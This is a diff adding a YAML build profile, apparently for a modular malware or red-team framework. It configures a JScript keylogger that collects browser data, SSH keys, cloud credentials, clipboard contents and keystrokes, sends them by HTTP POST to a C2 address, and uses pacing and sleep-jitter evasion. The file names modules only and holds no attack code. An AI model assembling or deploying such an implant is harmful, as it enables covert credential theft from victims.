@@ -1,0 +1,32 @@
+name: js_keylogger_heavy
+description: Heavy-recon keylogger with browser, SSH, and cloud credential collection
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/network
+  - collectors/installed_software
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/clipboard
+
+keylogger: collectors/keylogger_staged
+
+exfil: exfil/http_post
+arch: arch/keylogger
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/sleep_jitter
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  KEYLOG_DURATION: "30"
